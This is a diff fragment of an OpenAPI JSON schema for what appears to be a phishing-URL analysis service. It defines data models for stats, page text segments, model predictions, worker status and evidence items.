+          "post_id": {
+            "anyOf": [
+              {
+                "type": "string",
+                "maxLength": 100
+              },
+              {
+                "type": "null"
+              }
+            ],
+            "title": "Post Id"
+          },
+          "reasons": {
+            "anyOf": [
+              {
+                "items": {
+                  "type": "string"
+                },
+                "type": "array",
+                "maxItems": 20
+              },
+              {
+                "type": "null"
+              }
+            ],
+            "title": "Reasons"
+          }
+        },
+        "type": "object",
+        "title": "SourceRef",
+        "description": "Where ThreatRadar saw the URL (all optional, stored as given, shown to reviewers)."
+      },
+      "StatsOverview": {
+        "properties": {
+          "window": {
+            "type": "string",
+            "title": "Window"
+          },
+          "since": {
+            "type": "string",
+            "title": "Since"
+          },
+          "generated_at": {
+            "type": "string",
+            "title": "Generated At"
+          },
+          "total": {
+            "type": "integer",
+            "title": "Total"
+          },
+          "duplicates_skipped": {
+            "type": "integer",
+            "title": "Duplicates Skipped"
+          },
+          "by_verdict": {
+            "additionalProperties": {
+              "type": "integer"
+            },
+            "type": "object",
+            "title": "By Verdict"
+          },
+          "by_status": {
+            "additionalProperties": {
+              "type": "integer"
+            },
+            "type": "object",
+            "title": "By Status"
+          },
+          "by_threat_class": {
+            "additionalProperties": {
+              "type": "integer"
+            },
+            "type": "object",
+            "title": "By Threat Class"
+          },
+          "by_source": {
+            "additionalProperties": {
+              "type": "integer"
+            },
+            "type": "object",
+            "title": "By Source"
+          },
+          "by_language": {
+            "additionalProperties": {
+              "type": "integer"
+            },
+            "type": "object",
+            "title": "By Language"
+          },
+          "top_domains": {
+            "items": {
+              "$ref": "#/components/schemas/CountItem"
+            },
+            "type": "array",
+            "title": "Top Domains"
+          },
+          "top_brands": {
+            "items": {
+              "$ref": "#/components/schemas/CountItem"
+            },
+            "type": "array",
+            "title": "Top Brands"
+          },
+          "series_bucket": {
+            "type": "string",
+            "enum": [
+              "hour",
+              "day"
+            ],
+            "title": "Series Bucket"
+          },
+          "series": {
+            "items": {
+              "$ref": "#/components/schemas/SeriesPoint"
+            },
+            "type": "array",
+            "title": "Series"
+          },
+          "queue": {
+            "additionalProperties": {
+              "type": "integer"
+            },
+            "type": "object",
+            "title": "Queue"
+          },
+          "review": {
+            "additionalProperties": {
+              "type": "integer"
+            },
+            "type": "object",
+            "title": "Review"
+          },
+          "worker": {
+            "$ref": "#/components/schemas/WorkerStatus"
+          }
+        },
+        "type": "object",
+        "required": [
+          "window",
+          "since",
+          "generated_at",
+          "total",
+          "duplicates_skipped",
+          "by_verdict",
+          "by_status",
+          "by_threat_class",
+          "by_source",
+          "by_language",
+          "top_domains",
+          "top_brands",
+          "series_bucket",
+          "series",
+          "queue",
+          "review",
+          "worker"
+        ],
+        "title": "StatsOverview",
+        "description": "``GET /api/v1/stats/overview``."
+      },
+      "Stylesheet": {
+        "properties": {
+          "href_abs": {
+            "anyOf": [
+              {
+                "type": "string"
+              },
+              {
+                "type": "null"
+              }
+            ],
+            "title": "Href Abs"
+          },
+          "domain": {
+            "anyOf": [
+              {
+                "type": "string"
+              },
+              {
+                "type": "null"
+              }
+            ],
+            "title": "Domain"
+          },
+          "is_external": {
+            "type": "boolean",
+            "title": "Is External",
+            "default": false
+          }
+        },
+        "type": "object",
+        "title": "Stylesheet"
+      },
+      "TextModelOutput": {
+        "properties": {
+          "model": {
+            "type": "string",
+            "title": "Model"
+          },
+          "display_name": {
+            "type": "string",
+            "title": "Display Name"
+          },
+          "available": {
+            "type": "boolean",
+            "title": "Available"
+          },
+          "reason": {
+            "anyOf": [
+              {
+                "type": "string"
+              },
+              {
+                "type": "null"
+              }
+            ],
+            "title": "Reason"
+          },
+          "predicted": {
+            "anyOf": [
+              {
+                "type": "string"
+              },
+              {
+                "type": "null"
+              }
+            ],
+            "title": "Predicted"
+          },
+          "probabilities": {
+            "additionalProperties": {
+              "type": "number"
+            },
+            "type": "object",
+            "title": "Probabilities"
+          },
+          "dataset_version": {
+            "anyOf": [
+              {
+                "type": "string"
+              },
+              {
+                "type": "null"
+              }
+            ],
+            "title": "Dataset Version"
+          },
+          "seed": {
+            "anyOf": [
+              {
+                "type": "integer"
+              },
+              {
+                "type": "null"
+              }
+            ],
+            "title": "Seed"
+          },
+          "input_tokens": {
+            "anyOf": [
+              {
+                "type": "integer"
+              },
+              {
+                "type": "null"
+              }
+            ],
+            "title": "Input Tokens"
+          },
+          "truncated": {
+            "anyOf": [
+              {
+                "type": "boolean"
+              },
+              {
+                "type": "null"
+              }
+            ],
+            "title": "Truncated"
+          }
+        },
+        "type": "object",
+        "required": [
+          "model",
+          "display_name",
+          "available"
+        ],
+        "title": "TextModelOutput"
+      },
+      "TextPrediction": {
+        "properties": {
+          "schema_version": {
+            "type": "string",
+            "title": "Schema Version",
+            "default": "textpred_v1"
+          },
+          "sample_id": {
+            "anyOf": [
+              {
+                "type": "string"
+              },
+              {
+                "type": "null"
+              }
+            ],
+            "title": "Sample Id"
+          },
+          "page_language": {
+            "anyOf": [
+              {
+                "type": "string"
+              },
+              {
+                "type": "null"
+              }
+            ],
+            "title": "Page Language"
+          },
+          "page_text_chars": {
+            "type": "integer",
+            "title": "Page Text Chars",
+            "default": 0
+          },
+          "models": {
+            "items": {
+              "$ref": "#/components/schemas/TextModelOutput"
+            },
+            "type": "array",
+            "title": "Models"
+          },
+          "true_label": {
+            "anyOf": [
+              {
+                "type": "string"
+              },
+              {
+                "type": "null"
+              }
+            ],
+            "title": "True Label"
+          },
+          "split": {
+            "anyOf": [
+              {
+                "type": "string"
+              },
+              {
+                "type": "null"
+              }
+            ],
+            "title": "Split"
+          }
+        },
+        "type": "object",
+        "title": "TextPrediction"
+      },
+      "TextSegment": {
+        "properties": {
+          "segment_id": {
+            "type": "string",
+            "title": "Segment Id"
+          },
+          "field": {
+            "type": "string",
+            "enum": [
+              "title",
+              "meta_description",
+              "heading",
+              "paragraph",
+              "cta",
+              "form_label",
+              "placeholder",
+              "alert_banner",
+              "visible_other",
+              "hidden"
+            ],
+            "title": "Field"
+          },
+          "level": {
+            "anyOf": [
+              {
+                "type": "integer"
+              },
+              {
+                "type": "null"
+              }
+            ],
+            "title": "Level"
+          },
+          "text": {
+            "type": "string",
+            "title": "Text"
+          },
+          "order": {
+            "type": "integer",
+            "title": "Order"
+          },
+          "chars": {
+            "type": "integer",
+            "title": "Chars"
+          },
+          "count": {
+            "type": "integer",
+            "title": "Count",
+            "default": 1
+          },
+          "language": {
+            "type": "string",
+            "enum": [
+              "en",
+              "si",
+              "ta",
+              "si_latn",
+              "ta_latn",
+              "mixed",
+              "other",
+              "unknown"
+            ],
+            "title": "Language",
+            "default": "unknown"
+          },
+          "lang_confidence": {
+            "type": "number",
+            "title": "Lang Confidence",
+            "default": 0.0
+          },
+          "lang_method": {
+            "type": "string",
+            "title": "Lang Method",
+            "default": "none"
+          },
+          "script_mix": {
+            "additionalProperties": {
+              "type": "number"
+            },
+            "type": "object",
+            "title": "Script Mix"
+          }
+        },
+        "type": "object",
+        "required": [
+          "segment_id",
+          "field",
+          "text",
+          "order",
+          "chars"
+        ],
+        "title": "TextSegment",
+        "description": "One distinct piece of page text (repeats are merged, see ``count``)."
+      },
+      "ValidationError": {
+        "properties": {
+          "loc": {
+            "items": {
+              "anyOf": [
+                {
+                  "type": "string"
+                },
+                {
+                  "type": "integer"
+                }
+              ]
+            },
+            "type": "array",
+            "title": "Location"
+          },
+          "msg": {
+            "type": "string",
+            "title": "Message"
+          },
+          "type": {
+            "type": "string",
+            "title": "Error Type"
+          },
+          "input": {
+            "title": "Input"
+          },
+          "ctx": {
+            "type": "object",
+            "title": "Context"
+          }
+        },
+        "type": "object",
+        "required": [
+          "loc",
+          "msg",
+          "type"
+        ],
+        "title": "ValidationError"
+      },
+      "WorkerStatus": {
+        "properties": {
+          "enabled": {
+            "type": "boolean",
+            "title": "Enabled"
+          },
+          "running": {
+            "type": "boolean",
+            "title": "Running"
+          },
+          "state": {
+            "type": "string",
+            "title": "State"
+          },
+          "concurrency": {
+            "type": "integer",
+            "title": "Concurrency"
+          },
+          "jobs_per_second": {
+            "type": "number",
+            "title": "Jobs Per Second"
+          },
+          "in_flight": {
+            "type": "integer",
+            "title": "In Flight",
+            "default": 0
+          },
+          "processed": {
+            "type": "integer",
+            "title": "Processed",
+            "default": 0
+          },
+          "retried": {
+            "type": "integer",
+            "title": "Retried",
+            "default": 0
+          },
+          "failed": {
+            "type": "integer",
+            "title": "Failed",
+            "default": 0
+          },
+          "last_finished_at": {
+            "anyOf": [
+              {
+                "type": "string"
+              },
+              {
+                "type": "null"
+              }
+            ],
+            "title": "Last Finished At"
+          },
+          "last_error": {
+            "anyOf": [
+              {
+                "type": "string"
+              },
+              {
+                "type": "null"
+              }
+            ],
+            "title": "Last Error"
+          }
+        },
+        "type": "object",
+        "required": [
+          "enabled",
+          "running",
+          "state",
+          "concurrency",
+          "jobs_per_second"
+        ],
+        "title": "WorkerStatus"
+      },
+      "c2_analyzer__schemas__behavior__EvidenceItem": {
+        "properties": {
+          "kind": {
+            "type": "string",
+            "enum": [
+              "flow_step",
+              "source",
+              "sink",
+              "detection",
+              "html",
+              "script"
+            ],
+            "title": "Kind"
+          },
+          "ref": {
+            "anyOf": [
+              {
+                "type": "integer"
+              },
+              {
+                "type": "null"
+              }
+            ],
+            "title": "Ref"
+          },
+          "script_index": {
+            "anyOf": [
+              {
+                "type": "integer"
+              },
+              {
+                "type": "null"
+              }
+            ],
+            "title": "Script Index"
+          },
+          "line": {
+            "anyOf": [
+              {
+                "type": "integer"
+              },
+              {
+                "type": "null"
+              }
+            ],
+            "title": "Line"
+          },
+          "column": {
+            "anyOf": [
+              {
+                "type": "integer"
+              },
+              {
+                "type": "null"
+              }
+            ],
+            "title": "Column"
+          },
+          "code": {
+            "type": "string",
+            "title": "Code",
+            "default": ""
+          },
+          "note": {
+            "anyOf": [
+              {
+                "type": "string"
+              },
+              {
+                "type": "null"
+              }
+            ],
+            "title": "Note"
+          }
+        },
+        "additionalProperties": false,
+        "type": "object",
+        "required": [
+          "kind"
+        ],
+        "title": "EvidenceItem",
+        "description": "One line of evidence behind a finding."
+      },
+      "c2_analyzer__schemas__dom__EvidenceItem": {
+        "properties": {
+          "feature": {
+            "type": "string",
+            "title": "Feature"
+          },
+          "message": {
+            "type": "string",
+            "title": "Message"
+          },
+          "severity": {
+            "type": "string",
+            "enum": [
+              "high",
+              "medium",
+              "info"
+            ],
+            "title": "Severity",
+            "default": "info"
+          },
+          "value": {
+            "type": "number",
+            "title": "Value"
+          },
+          "details": {
+            "additionalProperties": true,
+            "type": "object",
+            "title": "Details"
+          }
+        },
+        "type": "object",
+        "required": [
+          "feature",
+          "message",
+          "value"
+        ],
+        "title": "EvidenceItem",
+        "description": "Why one feature is non-zero, in words (PII stays masked as Part 2 stored it)."
+      }
+    }
+  }
+}
